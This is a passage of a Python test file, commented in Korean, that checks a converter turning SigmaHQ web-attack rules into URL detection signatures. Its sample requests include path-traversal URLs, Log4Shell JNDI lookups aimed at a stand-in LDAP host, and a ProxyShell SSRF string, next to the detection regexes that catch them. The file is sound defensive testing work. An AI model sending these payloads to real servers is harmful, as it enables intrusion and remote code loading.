#!/usr/bin/env python3
"""공개 규칙(Sigma) 변환기 · sg1 규칙 파일 시험 (이슈 #54).  python3 detector/test_sigma_convert.py

pyyaml 이 있어야 돈다(개발 PC · 시험 컨테이너). psycopg2 가 없으면 가짜를 넣고 DB 시험은 건너뛴다.

DB 없이 보는 것
  - 값: 와일드카드(* ?) · 이스케이프(\\* \\? \\\\) · 메타 문자. 글자 값은 자기 자신에 맞고 regex_gap 을 통과한다
  - 조건자: contains · startswith · endswith · 같음 · all · re(regex_gap), 메서드 · 응답 코드, 옮기지 못하는 조건자 · 필드 · null
  - condition: and · or · not · 괄호 · 1 of · all of · them(밑줄 이름 제외) · 목록, 우선순위(not > and > or), 읽지 못하는 식
  - 논리합 표준형: not 분배 · 갈래 수 · 20개 상한, 옮기지 못하는 조건 보고(양이면 갈래를 버리고 음이면 조건만 뺀다)
  - 선정 10개 각각의 기대 서명(id · 조건 · cves), 선정표의 asset_match 가 c1 짝 서명과 글자가 같음
  - 생성 파일 재현: 같은 선정표 · 원본으로 다시 만들면 detector/rules_sigma.json 과 글자가 같다
  - 원본 보관: manifest.json 의 git blob sha1 이 파일과 같고, 보관한 파일이 manifest 와 같다
  - 모든 서명이 탐지기 검사(detect.url_signature_args)를 통과한다. 실험용(lab)도 같다
  - 표본 url: 원본 규칙마다 대표 공격 요청과 비슷한 정상 요청(오탐 확인). 파이썬 판(url_signature_fullmatch)으로 기대 서명
OPSLOOP_TEST_DATABASE_URL 이 있으면
  - 같은 표본을 연결 전용 임시 표에 넣고 R107 신호가 파이썬 판과 같은지(두 엔진 같은 답)
  - 서명의 정규식 하나하나를 PostgreSQL ~* 과 파이썬 fullmatch 로 같은 표본에 대 본다. 이스케이프한 글자 값도 본다
"""
import contextlib
import copy
import io
import json
import os
import re
import string
import sys
import types
import unittest
from datetime import datetime, timedelta, timezone
from unittest import mock

try:
    import psycopg2
    REAL_PG = True
except ImportError:
    fake, extras = types.ModuleType("psycopg2"), types.ModuleType("psycopg2.extras")
    extras.execute_batch = lambda *a, **k: None
    fake.extras = extras
    sys.modules["psycopg2"], sys.modules["psycopg2.extras"] = fake, extras
    REAL_PG = False

try:
    import yaml  # noqa: F401
except ImportError:
    sys.exit("pyyaml 이 필요합니다 (python3 -m pip install pyyaml)")

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import detect  # noqa: E402
import sigma_convert as sc  # noqa: E402

COMMIT = "07ec293a51695cb1131a2e05260247872b31e1e1"
TEST_PATH = "rules/web/webserver_generic/web_test_rule.yml"
UTC = timezone.utc
T0 = datetime(2026, 9, 27, 0, 0, tzinfo=UTC)


def load_json(name):
    with open(os.path.join(HERE, name), encoding="utf-8") as f:
        return json.load(f)


def rule_doc(detection, **meta):
    """합성 Sigma 규칙."""
    doc = {"title": "시험 규칙", "id": "11111111-2222-3333-4444-555555555555", "status": "test", "level": "high",
           "author": "시험", "tags": ["attack.t1190", "cve.2021-41773", "cve.2021-41773", "cve.21-1", "CVE.2024-123456"],
           "logsource": {"category": "webserver"}, "detection": detection}
    doc.update(meta)
    return doc


def conv(detection, **meta):
    return sc.convert(rule_doc(detection, **meta), TEST_PATH, COMMIT, "제품", "공급사")


def conds(rep):
    """보고의 서명에서 탐지 조건만."""
    keys = ("id", "pattern", "all_patterns", "not_patterns", "methods", "statuses")
    return [{k: s[k] for k in keys if k in s} for s in rep["signatures"]]


def notes(rep, i=0):
    return rep["signatures"][i]["sigma"]["notes"]


def sigs():
    return load_json("rules_sigma.json")["rules"][0]["params"]["signatures"]


# ----------------------------------------------------------------------
#  값 · 조건자
# ----------------------------------------------------------------------

class ValueTest(unittest.TestCase):
    def test_와일드카드와_이스케이프(self):
        for value, want, qmark in (
                ("a.b", r"a\.b", False), ("*", ".*", False), ("?", ".", True), ("/a*b?c", "/a.*b.c", True),
                ("a\\*b", r"a\*b", False), ("a\\?b", r"a\?b", False), ("a\\\\b", r"a\\b", False),
                ("a\\\\*", r"a\\.*", False), ("a\\x", r"a\\x", False), ("a\\", "a\\\\", False),
                (".^$+()[]{}|", r"\.\^\$\+\(\)\[\]\{\}\|", False),
                ("%/=@:;'\"#&~-,<>! _", "%/=@:;'\"#&~-,<>! _", False)):
            with self.subTest(value=value):
                self.assertEqual(sc.value_regex(value), (want, qmark))
                self.assertIsNone(detect.regex_gap(want))
        self.assertTrue(re.fullmatch(sc.value_regex("a\\*b")[0], "a*b"))
        self.assertFalse(re.fullmatch(sc.value_regex("a\\*b")[0], "axb"))
        self.assertTrue(re.fullmatch(sc.value_regex("a*b")[0], "axxb"))

    def test_글자_값은_자기_자신에만_맞는다(self):
        # 와일드카드 글자(* ?)와 역슬래시를 뺀 인쇄 가능 ASCII 전부. 두 엔진이 같게 읽는 이스케이프만 쓴다
        punct = "".join(c for c in string.printable if c not in "*?\\\t\n\r\x0b\x0c")
        for value in (punct, punct[::-1], "${jndi:ldap://x}", "..%252f", "/a b/c", "json?@foo".replace("?", "")):
            with self.subTest(value=value):
                rx, _ = sc.value_regex(value)
                self.assertIsNone(detect.regex_gap(rx))
                self.assertTrue(re.fullmatch(rx, value, re.I | re.S))
                self.assertFalse(re.fullmatch(rx, value + "x", re.I | re.S))


class ModifierTest(unittest.TestCase):
    def one(self, sel, **meta):
        rep = conv({"selection": sel, "condition": "selection"}, **meta)
        self.assertIsNone(rep["error"])
        [c] = conds(rep)
        return {k: v for k, v in c.items() if k != "id"}

    def test_url_조건자(self):
        cases = [
            ({"cs-uri-query|contains": "a.b"}, {"pattern": r"^.*a\.b.*$"}),
            ({"cs-uri-stem|startswith": ["/x", "/y"]}, {"pattern": "^(/x|/y).*$"}),
            ({"c-uri|endswith": ".php"}, {"pattern": r"^.*\.php$"}),
            ({"cs-uri": "/a*b?c"}, {"pattern": "^/a.*b.c$"}),
            # 한쪽 필드의 앵커 조건은 url 모양대로(질의는 url 처음 또는 ? 뒤, 경로는 ? 앞). 전체 URI 로 쓴 값도 그대로 맞는다
            ({"c-uri-query": 123}, {"pattern": r"^(123(\?.*)?|[^?]*\?123)$"}),
            ({"cs-uri-stem|endswith": ".jsp"}, {"pattern": r"^[^?]*\.jsp(\?.*)?$"}),
            ({"cs-uri-stem": "/ui/x"}, {"pattern": r"^/ui/x(\?.*)?$"}),
            ({"cs-uri-query|endswith": ".jsp"}, {"pattern": r"^.*\.jsp$"}),
            ({"cs-uri-query": "*?/dana/*"}, {"pattern": "^.*./dana/.*$"}),      # 양끝이 * 면 앵커 위치가 뜻을 바꾸지 않는다
            ({"c-uri-stem|contains|all": ["a", "b", "c"]}, {"pattern": "^.*a.*$", "all_patterns": ["^.*b.*$", "^.*c.*$"]}),
            ({"cs-uri-query|startswith|all": ["/a", "/ab"]},
             {"pattern": r"^(/a|[^?]*\?/a).*$", "all_patterns": [r"^(/ab|[^?]*\?/ab).*$"]}),
            ({"cs-uri-query|re": "/x[0-9]+"}, {"pattern": "^.*(/x[0-9]+).*$"}),
            ({"cs-uri-query|re": ["a|b", "c"]}, {"pattern": "^.*(a|b|c).*$"}),
            ({"cs-uri-query|re": "[$]x\\$"}, {"pattern": "^.*([$]x\\$).*$"}),       # 대괄호 안 · 이스케이프한 $ 는 글자
        ]
        for sel, want in cases:
            with self.subTest(sel=sel):
                self.assertEqual(self.one(sel), want)

    def test_메서드와_응답_코드(self):
        base = {"cs-uri-query|contains": "/a"}
        for sel, want in (({"cs-method": "post"}, {"methods": ["POST"]}),
                          ({"cs-method": ["GET", "POST"]}, {"methods": ["GET", "POST"]}),
                          ({"sc-status": 200}, {"statuses": [200]}),
                          ({"sc-status": ["301", 200, 200]}, {"statuses": [200, 301]})):
            with self.subTest(sel=sel):
                self.assertEqual(self.one({**base, **sel}), {"pattern": "^.*/a.*$", **want})

    def test_옮기지_못하는_조건은_갈래를_버린다(self):
        base = {"cs-uri-query|contains": "/a"}
        for sel, why in (({"cs-user-agent": "curl"}, "필드 cs-user-agent"),
                         ({"cs-uri-query|base64offset|contains": "x"}, "조건자 base64offset"),
                         ({"cs-uri-query|contains|cased": "x"}, "조건자 cased"),
                         ({"cs-uri-query|contains|windash": "x"}, "조건자 windash"),
                         ({"cs-uri-query|contains|startswith": "x"}, "함께 쓴다"),
                         ({"cs-uri-query|re": "\\bx"}, "re 값이 두 엔진에서 같게 읽히지 않는다"),
                         ({"cs-uri-query|re": "(?i)x"}, "re 값이 두 엔진에서 같게 읽히지 않는다"),
                         ({"cs-uri-query|re": "/x$|/y"}, "끝 줄바꿈 앞에서 두 엔진의 뜻이 다르다"),
                         ({"cs-method|contains": "PO"}, "cs-method 의 조건자 contains"),
                         ({"cs-method": "P*"}, "메서드 값"),
                         ({"sc-status": "2xx"}, "응답 코드 값"), ({"sc-status": 700}, "응답 코드 값"),
                         ({"sc-status": True}, "응답 코드 값"), ({"sc-status|gt": 399}, "조건자 gt"),
                         ({"cs-referer": None}, "null"), ({"cs-uri-query": []}, "값이 없다"),
                         ({"cs-uri-query|contains": [["x"]]}, "문자열이 아니다")):
            with self.subTest(sel=sel):
                rep = conv({"selection": {**base, **sel}, "condition": "selection"})
                self.assertEqual(rep["signatures"], [])
                self.assertIn("서명으로 옮긴 갈래가 없다", rep["error"])
                [(i, reason)] = rep["dropped"]
                self.assertEqual(i, 1)
                self.assertIn(why, reason)

    def test_키워드는_url_포함으로(self):
        for sel, want in ((["${jndi:", "/x?y"], "^.*(\\$\\{jndi:|/x.y).*$"), ("a b", "^.*a b.*$"),
                          ({"|all": ["POST", 200]}, None)):
            with self.subTest(sel=sel):
                rep = conv({"keywords": sel, "condition": "keywords"})
                [c] = conds(rep)
                if want:
                    self.assertEqual(c["pattern"], want)
                else:
                    self.assertEqual((c["pattern"], c["all_patterns"]), ("^.*POST.*$", ["^.*200.*$"]))
                self.assertTrue(any("keywords" in n and "좁아짐" in n for n in notes(rep)))


# ----------------------------------------------------------------------
#  condition · 논리합 표준형
# ----------------------------------------------------------------------

SEL = {n: {"cs-uri-query|contains": n.upper()} for n in ("a", "b", "c", "x")}


def branches(condition, **sels):
    """condition 을 편 갈래마다 (pattern, all_patterns, not_patterns)."""
    rep = conv({**SEL, **sels, "condition": condition})
    if rep["error"]:
        return rep["error"]
    return [(c["pattern"], c.get("all_patterns", []), c.get("not_patterns", [])) for c in conds(rep)]


def P(*letters):
    return [f"^.*{x}.*$" for x in letters]


class ConditionTest(unittest.TestCase):
    def test_and_or_not_괄호(self):
        for condition, want in (
                ("a", [(P("A")[0], [], [])]),
                ("a and b", [(P("A")[0], P("B"), [])]),
                ("a or b", [(P("A")[0], [], []), (P("B")[0], [], [])]),
                ("a and (b or c)", [(P("A")[0], P("B"), []), (P("A")[0], P("C"), [])]),
                ("(a or b) and c", [(P("A")[0], P("C"), []), (P("B")[0], P("C"), [])]),
                ("a and not b", [(P("A")[0], [], P("B"))]),
                ("a and not b or c", [(P("A")[0], [], P("B")), (P("C")[0], [], [])]),      # not > and > or
                ("not b and a", [(P("A")[0], [], P("B"))]),
                ("x and not (a or b)", [(P("X")[0], [], P("A", "B"))]),
                ("x and not (a and b)", [(P("X")[0], [], P("A")), (P("X")[0], [], P("B"))]),   # not 분배
                ("x and not not a", [(P("X")[0], P("A"), [])]),
                ("((a))", [(P("A")[0], [], [])]),
                ("a and a", [(P("A")[0], [], [])])):                                        # 같은 조건은 한 번
            with self.subTest(condition=condition):
                self.assertEqual(branches(condition), want)

    def test_1_of_all_of_them(self):
        sels = {"sel_1": {"cs-uri-query|contains": "S1"}, "sel_2": {"cs-uri-query|contains": "S2"},
                "_hidden": {"cs-uri-query|contains": "H"}}
        for condition, want in (
                ("1 of sel_*", [(P("S1")[0], [], []), (P("S2")[0], [], [])]),
                ("all of sel_*", [(P("S1")[0], P("S2"), [])]),
                ("all of sel*", [(P("S1")[0], P("S2"), [])]),
                ("1 of sel_1*", [(P("S1")[0], [], [])]),
                ("all of them", [(P("A")[0], P("B", "C", "X", "S1", "S2"), [])]),         # 밑줄 이름은 빠진다
                ("1 of them and not _hidden", None),
                ("_hidden", [(P("H")[0], [], [])])):
            with self.subTest(condition=condition):
                got = branches(condition, **sels)
                if want is None:
                    self.assertEqual(len(got), 6)
                    self.assertTrue(all(b[2] == P("H") for b in got))
                else:
                    self.assertEqual(got, want)

    def test_condition_목록은_논리합(self):
        rep = conv({**SEL, "condition": ["a", "b and c"]})
        self.assertEqual([(c["pattern"], c.get("all_patterns")) for c in conds(rep)],
                         [(P("A")[0], None), (P("B")[0], P("C"))])

    def test_읽지_못하는_condition(self):
        for condition, why in (("a and", "읽지 못했다"), ("a b", "읽지 못했다"), ("(a", "읽지 못했다"), ("a)", "읽지 못했다"),
                               ("", "문자열이 아니다"), ("zz", "'zz' 선택이 없다"), ("1 of zz*", "맞는 선택이 없다"),
                               ("2 of a", "읽지 못했다"), ("any of a", "'any' 선택이 없다"), ("them", "읽지 못했다"),
                               ("a | count() > 5", "집계"), ("not", "읽지 못했다")):
            with self.subTest(condition=condition):
                rep = conv({**SEL, "condition": condition})
                self.assertEqual(rep["signatures"], [])
                self.assertIn(why, rep["error"])

    def test_갈래는_20개까지(self):
        sels = {f"{g}{i}": {"cs-uri-query|contains": f"{g}{i}"} for g in "pq" for i in range(1, 6)}
        rep = conv({**sels, "condition": "(p1 or p2 or p3 or p4 or p5) and (q1 or q2 or q3 or q4)"})
        self.assertEqual(len(rep["signatures"]), 20)
        self.assertEqual([s["id"] for s in rep["signatures"]][-1], "sg-test-rule-20")
        rep = conv({**sels, "condition": "(p1 or p2 or p3 or p4 or p5) and (q1 or q2 or q3 or q4 or q5)"})
        self.assertIn("20개를 넘는다", rep["error"])
        # 목록 선택(값 여럿이 아니라 선택 여럿)도 갈래를 만든다
        rep = conv({"s": [{"cs-uri-query|contains": f"v{i}"} for i in range(21)], "condition": "s"})
        self.assertIn("20개를 넘는다", rep["error"])


class BranchTest(unittest.TestCase):
    def test_필터를_옮기지_못하면_빼고_넓어짐을_적는다(self):
        rep = conv({"selection": {"cs-uri-query|contains": "/a"}, "filter": {"cs-user-agent|contains": "Nessus"},
                    "condition": "selection and not filter"})
        self.assertEqual(conds(rep), [{"id": "sg-test-rule", "pattern": "^.*/a.*$"}])
        self.assertTrue(notes(rep)[0].startswith("필터 조건 cs-user-agent|contains(필드 cs-user-agent)을 옮기지 못해 뺐다"))
        self.assertIn("넓어짐", notes(rep)[0])
        self.assertIn(notes(rep)[0], rep["signatures"][0]["source"])          # 핵심 notes 한 줄이 source 에

    def test_양의_조건을_옮기지_못한_갈래는_버리고_좁아짐을_적는다(self):
        rep = conv({"sel_ok": {"cs-uri-query|contains": "/a"}, "sel_ua": {"cs-uri-query|contains": "/b",
                                                                          "cs-user-agent": "x"},
                    "condition": "1 of sel_*"})
        self.assertEqual(rep["dropped"], [(2, "옮기지 못하는 조건 cs-user-agent(필드 cs-user-agent)")])
        self.assertEqual(conds(rep), [{"id": "sg-test-rule", "pattern": "^.*/a.*$"}])
        self.assertIn("원본의 다른 갈래 1개는 옮기지 못해 버렸다", notes(rep)[0])
        self.assertIn("좁다", notes(rep)[0])
        self.assertIn("갈래 2개 가운데 1번째", " ".join(notes(rep)))

    def test_한쪽_필드의_앵커_조건도_url_에서_맞는다(self):
        # CVE-2025-31324 꼴: 경로에 /irj/ · .jsp, 질의가 cmd= 로 시작. url 전체에 ^cmd= 를 대면 '/' 로 시작하는 url 에 맞을 수 없다
        rep = conv({"selection_uri": {"cs-uri-stem|contains|all": ["/irj/", ".jsp"]},
                    "selection_query": {"cs-uri-query|startswith": ["cmd=", "exec="]}, "condition": "all of selection_*"})
        [sig] = rep["signatures"]
        hit = lambda url: detect.url_signature_fullmatch(sig, "GET", url, 200)  # noqa: E731
        self.assertTrue(hit("/irj/servlet_jsp/irj/root/helper.jsp?cmd=id"))
        self.assertTrue(hit("/irj/x.jsp?exec=ls"))
        self.assertFalse(hit("/irj/x.jsp"))
        self.assertFalse(hit("/irj/x.jsp?x=1&cmd=id"))        # 질의가 cmd= 로 '시작' 하지 않는다
        # 전체 URI 로 적은 값(SigmaHQ 관례)도 그대로 맞는다
        [full] = conv({"s": {"cs-uri-query|startswith": "/admin/"}, "condition": "s"})["signatures"]
        self.assertTrue(detect.url_signature_fullmatch(full, "GET", "/admin/x", None))
        [stem] = conv({"s": {"cs-uri-stem": "/uploadova"}, "condition": "s"})["signatures"]
        self.assertTrue(detect.url_signature_fullmatch(stem, "POST", "/uploadova?x=1", None))
        self.assertFalse(detect.url_signature_fullmatch(stem, "POST", "/uploadova/x", None))

    def test_필터의_표시는_양의_조건과_방향이_반대다(self):
        # keywords 필터를 url 에만 대면 필터가 약해져 넓어진다(Log4j 의 nessus 필터)
        rep = conv({"keywords": ["${jndi:"], "filter": ["w.nessus.org/nessus"], "condition": "keywords and not filter"})
        text = " ".join(notes(rep))
        self.assertIn("keywords(로그 줄 전체에서 찾는 값)를 요청 url 에만 댔다", text)          # 양의 keywords: 좁아짐
        self.assertIn("필터 keywords 를 요청 url 에서만 찾는다", text)
        self.assertIn("(넓어짐)", notes(rep)[0])                                        # 필터가 약해진 것을 먼저 적는다
        self.assertIn(notes(rep)[0], rep["signatures"][0]["source"])
        # 한쪽 필드 · ? 필터를 url 전체에 대면 더 많이 걸러 좁아진다
        rep = conv({"s": {"cs-uri-query|contains": "/a"}, "f": {"cs-uri-stem|contains": "sk?p"},
                    "condition": "s and not f"})
        text = " ".join(notes(rep))
        self.assertIn("필터 필드 cs-uri-stem 를 요청 url 하나에 댔다", text)
        self.assertIn("필터 값의 ? 를 아무 글자 하나로 옮겨 원본보다 더 많이 거른다(좁아짐)", text)
        self.assertNotIn("값의 ? 는 Sigma 와일드카드라", text)                        # 양의 qmark 문장은 없다

    def test_비ASCII_값과_글자_번호_이스케이프는_옮기지_않는다(self):
        # 대소문자 접기가 두 엔진에서 다르다(ſ · ı) · \x 뒤 16진 글자를 두 엔진이 다르게 읽는다
        for sel in ({"cs-uri-query|contains": "/ſ"}, {"cs-uri-query|re": r"\x2fetc"}, {"cs-uri-query|re": r"\u002f"}):
            with self.subTest(sel=sel):
                rep = conv({"s": sel, "condition": "s"})
                self.assertIsNotNone(rep["error"])

    def test_메서드_응답_코드(self):
        base = {"u": {"cs-uri-query|contains": "/a"}, "m": {"cs-method": ["GET", "POST"]}, "m2": {"cs-method": "POST"},
                "m3": {"cs-method": "GET"}, "s": {"sc-status": [200, 301]}, "s2": {"sc-status": 404}}
        rep = conv({**base, "condition": "u and m and m2 and s"})
        self.assertEqual(conds(rep), [{"id": "sg-test-rule", "pattern": "^.*/a.*$", "methods": ["POST"],
                                       "statuses": [200, 301]}])
        # 음의 메서드 · 응답 코드는 옮기지 못해 뺀다(넓어짐)
        rep = conv({**base, "condition": "u and not m2 and not s2"})
        self.assertEqual(conds(rep), [{"id": "sg-test-rule", "pattern": "^.*/a.*$"}])
        self.assertEqual(sum("부정 조건" in n and "넓어짐" in n for n in notes(rep)), 2)
        # 어긋나는 조건 · url 조건이 없는 갈래 · 같은 url 을 양 · 음으로 둔 갈래는 서명이 없다
        for condition, why in (("u and m2 and m3", "메서드 조건이 서로 어긋나"), ("u and s and s2", "응답 코드 조건이 서로 어긋나"),
                               ("m and s", "url 조건이 없어"), ("u and not u", "양 · 음")):
            with self.subTest(condition=condition):
                rep = conv({**base, "condition": condition})
                self.assertEqual(rep["signatures"], [])
                self.assertIn(why, rep["error"])

    def test_규칙_머리(self):
        rep = conv({"s": {"cs-uri-query|contains": "/a"}, "condition": "s"})
        s = rep["signatures"][0]
        self.assertEqual(s["cves"], ["CVE-2021-41773", "CVE-2024-123456"])     # 꼴이 맞는 것만, 겹침 없이
        self.assertEqual((s["product"], s["vendor"], s["mapping"]), ("제품", "공급사", "sigma"))
        self.assertNotIn("asset_match", s)
        self.assertEqual(s["sigma"]["url"], f"https://github.com/SigmaHQ/sigma/blob/{COMMIT}/{TEST_PATH}")
        self.assertTrue(s["source"].startswith("SigmaHQ 규칙 '시험 규칙'(11111111-2222-3333-4444-555555555555) · 작성 "
                                               "시험 · test/high · DRL 1.1 로 배포된 것을 변환했다. "))
        for meta, why in (({"logsource": {"category": "proxy"}}, "webserver"), ({"id": "x"}, "uuid"),
                          ({"status": "draft"}, "status"), ({"level": "severe"}, "level"), ({"title": " "}, "title")):
            with self.subTest(meta=meta):
                self.assertIn(why, conv({"s": {"cs-uri-query|contains": "/a"}, "condition": "s"}, **meta)["error"])
        rep = conv({"s": {"cs-uri-query|contains": "/a"}, "condition": "s"}, tags=["attack.t1190"],
                   logsource={"category": "webserver", "product": "apache", "definition": "요건"})
        self.assertEqual(rep["signatures"][0]["cves"], [])
        self.assertIn("원본 tags 에 CVE 가 없어 cves 를 비웠다.", notes(rep))
        self.assertIn("원본 logsource 의 한정(product=apache)은 보지 않는다(넓어짐).", notes(rep))

    def test_서명_id(self):
        for path, want in (("x/web_cve_2021_41773_apache_path_traversal.yml", "sg-cve-2021-41773-apache-path-traversal"),
                           ("x/web_exploit_cve_2023_22518_confluence_auth_bypass.yml", "sg-exploit-cve-2023-22518-confluence"),
                           ("x/web_cve_2023_25157_geoserver_sql_injection.yml", "sg-cve-2023-25157-geoserver-sql"),
                           ("x/Proxy_Weird.Name.yml", "sg-proxy-weird-name")):
            with self.subTest(path=path):
                got = sc.fit_id(sc.base_id(path))
                self.assertEqual(got, want)
                self.assertLessEqual(len(got), sc.ID_MAX)
                self.assertTrue(detect.SIG_ID_RE.fullmatch(got))
        self.assertEqual(sc.fit_id("sg-" + "a" * 50, "-12"), "sg-" + "a" * 34 + "-12")


# ----------------------------------------------------------------------
#  선정 10개 · 규칙 파일
# ----------------------------------------------------------------------

S41773 = "sg-cve-2021-41773-apache-path-traversal"
SLOG4J = "sg-cve-2021-44228-log4j"
S3398 = "sg-cve-2019-3398-confluence"
S22518 = "sg-exploit-cve-2023-22518-confluence"
S0688 = "sg-cve-2020-0688-msexchange"
SPS1, SPS2 = "sg-exchange-proxyshell-1", "sg-exchange-proxyshell-2"
S25157 = "sg-cve-2023-25157-geoserver-sql"
S11510 = "sg-cve-2019-11510-pulsesecure-exploit"
S22893 = "sg-cve-2021-22893-pulse-secure-rce"
SPATH = "sg-path-traversal-exploitation-attempt"

LOG4J = ("^.*(" + "|".join([
    r"\$\{jndi:ldap:/", r"\$\{jndi:rmi:/", r"\$\{jndi:ldaps:/", r"\$\{jndi:dns:/", r"/\$%7bjndi:", r"%24%7bjndi:",
    r"\$%7Bjndi:", r"%2524%257Bjndi", r"%2F%252524%25257Bjndi%3A", r"\$\{jndi:\$\{lower:", r"\$\{::-j\}\$\{",
    r"\$\{jndi:nis", r"\$\{jndi:nds", r"\$\{jndi:corba", r"\$\{jndi:iiop", r"Reference Class Name: foo",
    r"\$\{\$\{env:BARFOO:-j\}", r"\$\{::-l\}\$\{::-d\}\$\{::-a\}\$\{::-p\}", r"\$\{base64:JHtqbmRp",
    r"\$\{\$\{env:ENV_NAME:-j\}ndi\$\{env:ENV_NAME:-:\}\$", r"\$\{\$\{lower:j\}ndi:", r"\$\{\$\{upper:j\}ndi:",
    r"\$\{\$\{::-j\}\$\{::-n\}\$\{::-d\}\$\{::-i\}:"]) + ").*$")

# 원본 경로 → [(서명 id, 탐지 조건, cves)]
EXPECTED = {
    "rules-emerging-threats/2021/Exploits/CVE-2021-41773/web_cve_2021_41773_apache_path_traversal.yml": [
        (S41773, {"pattern": r"^.*(/cgi-bin/\.%2e/|/icons/\.%2e/|/cgi-bin/\.%%32%65/|/icons/\.%%32%65/|"
                             r"/cgi-bin/\.%%%25%33|/icons/\.%%%25%33).*$", "statuses": [200, 301]},
         ["CVE-2021-41773"])],
    "rules-emerging-threats/2021/Exploits/CVE-2021-44228/web_cve_2021_44228_log4j.yml": [
        (SLOG4J, {"pattern": LOG4J, "not_patterns": [r"^.*(w\.nessus\.org/nessus|/nessus\}).*$"]}, [])],
    "rules-emerging-threats/2019/Exploits/CVE-2019-3398/web_cve_2019_3398_confluence.yml": [
        (S3398, {"pattern": r"^.*/upload\.action.*$", "all_patterns": [r"^.*filename=\.\./\.\./\.\./\.\./.*$"],
                 "methods": ["POST"]}, ["CVE-2019-3398"])],
    "rules-emerging-threats/2023/Exploits/CVE-2023-22518/web_exploit_cve_2023_22518_confluence_auth_bypass.yml": [
        (S22518, {"pattern": r"^.*(/json/setup-restore-local\.action|/json/setup-restore-progress\.action|"
                             r"/json/setup-restore\.action|/server-info\.action|/setup/setupadministrator\.action).*$",
                  "methods": ["POST"], "statuses": [200, 302, 405]}, ["CVE-2023-22518"])],
    "rules-emerging-threats/2020/Exploits/CVE-2020-0688/web_cve_2020_0688_msexchange.yml": [
        (S0688, {"pattern": "^.*(/ecp/|/owa/).*$", "all_patterns": ["^.*__VIEWSTATE=.*$"], "methods": ["GET"]},
         ["CVE-2020-0688"])],
    "rules-emerging-threats/2021/Exploits/ProxyShell-Exploit/web_exchange_proxyshell.yml": [
        (SPS1, {"pattern": r"^.*/autodiscover\.json.*$", "all_patterns": ["^.*(/powershell|/mapi/nspi|/EWS|X-Rps-CAT).*$"],
                "statuses": [401]}, []),
        (SPS2, {"pattern": r"^.*(autodiscover\.json.@|autodiscover\.json%3f@|%3f@foo\.com|"
                           r"Email=autodiscover/autodiscover\.json|json.@foo\.com).*$", "statuses": [401]}, [])],
    "rules-emerging-threats/2023/Exploits/CVE-2023-25157/web_cve_2023_25157_geoserver_sql_injection.yml": [
        (S25157, {"pattern": "^.*/geoserver/ows.*$",
                  "all_patterns": ["^.*CQL_FILTER=.*$",
                                   "^.*(PropertyIsLike|strEndsWith|strStartsWith|FeatureId|jsonArrayContains|DWithin).*$",
                                   r"^.*(\+--|\+AS\+|\+OR\+|FROM|ORDER\+BY|SELECT|sleep%28|substring%28|UNION|WHERE).*$"],
                  "methods": ["GET"]}, ["CVE-2023-25157"])],
    "rules-emerging-threats/2019/Exploits/CVE-2019-11510/web_cve_2019_11510_pulsesecure_exploit.yml": [
        (S11510, {"pattern": "^.*./dana/html5acc/guacamole/.*$"}, ["CVE-2019-11510"])],
    "rules-emerging-threats/2021/Exploits/CVE-2021-22893/web_cve_2021_22893_pulse_secure_rce_exploit.yml": [
        (S22893, {"pattern": "^.*(/dana-na/auth/|/dana-ws/|/dana-cached/).*$",
                  "all_patterns": [r"^.*(.id=|.token=|Secid_canceltoken\.cgi|CGI::param|meeting|smb|namedusers|metric).*$"]},
         ["CVE-2021-22893"])],
    "rules/web/webserver_generic/web_path_traversal_exploitation_attempt.yml": [
        (SPATH, {"pattern": r"^.*(\.\./\.\./\.\./\.\./\.\./lib/password|\.\./\.\./\.\./\.\./windows/|\.\./\.\./\.\./etc/|"
                            r"\.\.%252f\.\.%252f\.\.%252fetc%252f|\.\.%c0%af\.\.%c0%af\.\.%c0%afetc%c0%af|"
                            r"%252e%252e%252fetc%252f).*$"}, [])],
}

# 표본 (메서드, url, 응답 코드, 맞아야 하는 서명). 원본 규칙마다 대표 공격 요청과 비슷한 정상 요청(오탐 확인)을 둔다.
# url 은 web-01(nginx) 꼴(원시 요청 대상, 질의 포함)과 디코이 꼴(1회 디코딩된 경로)을 섞는다
SAMPLES = [
    # CVE-2021-41773 · 42013: 원본은 퍼센트 인코딩 그대로와 응답 코드 200 · 301 을 본다
    ("GET", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", 200, [S41773]),
    ("GET", "/icons/.%%32%65/.%%32%65/.%%32%65/etc/passwd", 301, [S41773]),
    ("GET", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", 404, []),                      # 응답 코드가 달라 빠진다
    ("GET", "/cgi-bin/.%2e/.%2e/bin/sh", None, []),                              # 응답 코드가 없는 행
    ("GET", "/cgi-bin/../../../../bin/sh", 200, []),                              # 디코딩된 꼴은 원본이 보지 않는다
    ("GET", "/cgi-bin/../../../etc/passwd", 404, [SPATH]),                        # 일반 경로 조작에는 맞는다
    ("GET", "/cgi-bin/status.cgi", 200, []),
    ("GET", "/icons/apache_pb.png", 200, []),
    # Log4Shell (키워드 · 스캐너 필터)
    ("GET", "/?x=${jndi:ldap://203.0.113.5/a}", 404, [SLOG4J]),
    ("GET", "/%24%7Bjndi:ldap://203.0.113.5/a%7D", 400, [SLOG4J]),
    ("GET", "/${jndi:ldap://w.nessus.org/nessus}", 404, []),                     # 원본이 거르는 스캐너
    ("GET", "/docs/jndi-lookup.html", 200, []),
    ("GET", "/search?q=%24%7Bprice%7D", 200, []),
    # CVE-2019-3398
    ("POST", "/plugins/drag-and-drop/upload.action?pageId=65537&filename=../../../../opt/x.jsp&size=8", 200, [S3398]),
    ("GET", "/plugins/drag-and-drop/upload.action?pageId=65537&filename=../../../../opt/x.jsp&size=8", 200, []),
    ("POST", "/plugins/drag-and-drop/upload.action?pageId=65537&filename=report.pdf&size=8", 200, []),
    # CVE-2023-22518
    ("POST", "/json/setup-restore.action?synchronous=true", 200, [S22518]),
    ("POST", "/json/setup-restore-local.action", 302, [S22518]),
    ("POST", "/json/setup-restore.action", 404, []),
    ("GET", "/server-info.action", 200, []),
    ("POST", "/json/startheartbeatactivity.action", 200, []),
    # CVE-2020-0688
    ("GET", "/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE=%2FwEyhAYAAQAAAP", 200, [S0688]),
    ("POST", "/ecp/default.aspx?__VIEWSTATE=x", 200, []),
    ("GET", "/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2fmail%2fowa%2f", 200, []),
    # ProxyShell (두 갈래)
    ("GET", "/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com",
     401, [SPS1, SPS2]),
